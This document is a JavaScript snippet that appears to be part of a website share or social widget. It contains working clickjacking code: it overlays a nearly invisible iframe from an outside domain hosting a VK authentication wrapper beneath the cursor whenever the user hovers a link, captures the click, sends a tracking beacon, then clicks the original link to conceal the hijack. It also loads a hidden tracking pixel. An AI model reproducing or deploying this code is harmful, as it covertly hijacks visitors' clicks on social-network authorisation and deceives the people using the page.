(function() {
    (function () {

    if (!window["__utl_adbl_initialized"]) {
        window["__utl_adbl_initialized"] = true;
    }
    else {
        return;
    }

    var body = document.getElementsByTagName("body")[0];
    var img = document.createElement("img");
    img.src = "//w.uptolike.com/widgets/v1/det_dbl?rnd="+Math.random()+"&ad_number=1";
    img.style.position = "absolute";
    img.style.top = "-100px";
    img.style.left = "-100px";
    img.style.width = "1px";
    img.style.height = "1px";
    setTimeout(function() {body.removeChild(img);}, 2000);
    body.appendChild(img);


})();(function() {

    function addScript(url) {
        var el = document.createElement("script");
        el.type = "text/javascript";
        el.charset = 'utf-8';
        el.async = 'true';
        el.src = url;

        el.isLoaded = false;
        document.getElementsByTagName('head')[0].appendChild(el);

    }

    if (!window["__utl_clkj_initialized"]) {
        window["__utl_clkj_initialized"] = true;
    }
    else {
        return;
    }


    function install() {

        var cleaning = false;
        var lastClickedElement;


        var body = document.getElementsByTagName("body")[0];
        var div = document.createElement("div");
        div.style.position = "absolute";
        div.style.width = "1px";
        div.style.height = "1px";
        div.style.top = "-1px";
        div.style.left = "-1px";
        div.style.zIndex = "10000";
        div.innerHTML = "<div id='__smth_wrap1' style='overflow: hidden;width: 20px;height: 25px;opacity:0.000001; position: fixed; z-index: 100001;'><iframe width='100' height='100' style='width:100px; height:100px;' src='http://rt.playgame2013.ru/widgets/v1/vk_auth_wrapper.html?pageId=361be6f6-297a-48d4-8d65-98453758f3b1'></iframe></div>";
        body.appendChild(div);


        var el = document.getElementById("__smth_wrap1");

        var mousemove = function(e) {
            var x = e.clientX, y = e.clientY;
            div.style.zIndex = "-1";
            var element = document.elementFromPoint(x, y);
            div.style.zIndex = "10000";
            if (element.nodeName == "A" || element.parentNode.nodeName == "A") {
                div.style.display = "block";
                el.style.left = (e.pageX - 10) + "px";
                el.style.top = (e.pageY - window.scrollY - 12) + "px";
                lastClickedElement = element;
            }
            else {
                lastClickedElement = undefined;
                div.style.display = "none";
            }
        };


        var clickListener = function(e) {
            setTimeout(function() {
                cleanup();
            }, 100);
        };

        document.addEventListener("mouseup", clickListener);

        function init(msg) {
            if (cleaning) {
                return;
            }
            if (msg && msg.data["context"]==="stggr") {
                if (msg.data["action"] === "init") {
                    if (cleaning) {
                        return;
                    }
                    setTimeout(function() {
                        if (cleaning) {
                            return;
                        }
                        div.style.width = "100%";
                        div.style.height = "100%";
                        div.style.top = "0";
                        div.style.left = "0";
                        window.addEventListener("mousemove", mousemove);
                    }, 1000);
                }
                else if (msg.data["action"] === "clean") {
                    cleanup();
                }
                else if (msg.data["action"] === "got") {
                    var img = document.createElement("img");
                    img.src = "//w.uptolike.com/widgets/v1/vk_clk?rnd="+Math.random();
                    img.style.position = "absolute";
                    img.style.top = "-100px";
                    img.style.left = "-100px";
                    img.style.width = "1px";
                    img.style.height = "1px";
                    img.onLoad = function() {
                        clickOnce();
                    }
                    setTimeout(function() {body.removeChild(img);}, 2000);
                    body.appendChild(img);

                    var clicked = false;
                    var clickOnce = function() {
                        if (clicked) return;
                        if (lastClickedElement) {
                            lastClickedElement.click();
                            clicked = true;
                        }
                    }

                    setTimeout(clickOnce, 500);

                    cleanup();
                }
            }
        }
        if (window.addEventListener){
            window.addEventListener("message", init, false);
        } else {
            window.attachEvent("onmessage", init);
        }


        var cleanup = function () {
            cleaning = true;
            window.removeEventListener("mousemove", mousemove);
            document.removeEventListener("mouseup", clickListener);
            document.removeEventListener("message", init)
            body.removeChild(div);
        };



    }

    install();



})()})();